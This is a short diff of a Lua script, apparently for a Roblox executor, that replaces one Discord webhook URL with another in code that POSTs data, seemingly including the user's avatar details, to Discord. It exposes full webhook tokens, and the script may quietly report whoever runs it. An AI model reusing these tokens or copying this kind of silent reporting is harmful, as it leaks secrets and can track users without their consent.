@@ -1623,8 +1623,8 @@ local avatarUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userId
 -- 📤 Send to webhook
 local success, response = pcall(function()
     return request({
-        Url = "https://discord.com/api/webhooks/1498468165372350576/FsEeMKdUL33ceRSmwGmERTQvlI4zfOz4vpK-sVsuQxE6WSXNITNs1en3_jTxUEF6wV06",
-        Method = "POST",
+        Url = "https://discord.com/api/webhooks/1498524742938918984/vGxWoQi8MqzOuALuTVfdCm55E89o9QtOqvrpl6jvh6x07xEHpR1jVwiEBYwMifhQLNe_",
+		Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
